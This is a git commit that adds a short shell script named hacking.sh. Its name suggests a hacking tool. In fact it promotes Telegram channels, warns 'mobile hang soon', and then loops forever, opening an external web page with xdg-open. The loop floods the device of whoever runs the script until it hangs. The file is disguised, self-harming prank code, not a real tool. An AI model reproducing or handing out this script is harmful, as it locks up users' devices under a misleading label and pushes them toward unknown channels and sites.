32c75d2d7c69e0c2d9aeda2a5b9e8722bc0e426f
WhiteHatTeamOfficial <110399247+WhiteHatTeamOfficial@users.noreply.github.com>
2022-08-01 18:32:50 +0530

    Create hacking.sh

---
+++ hacking.sh
@@ -0,0 +1,29 @@
+echo " This tool developer : KARTHICK "
+
+sleep 2
+
+clear
+
+echo "       𝐉𝐨𝐢𝐧 𝐭𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐜𝐡𝐚𝐧𝐧𝐞𝐥  " 
+
+echo ""
+
+echo " https://telegram.me/+XMtcMQHjpx1kYzY1" 
+
+echo " "
+
+echo "          ☠️ 🄲🅈🄱🄴🅁 🅆🄰🅁🄽🄸🄽🄶 ⚠️ "
+
+echo " mobile hang soon "
+
+sleep 2 
+
+xdg-open https://telegram.me/ANONYMOUSKINGCHANNEL
+
+while :
+
+do
+
+xdg-open https://jockerrk.w3spaces.com/
+
+done 
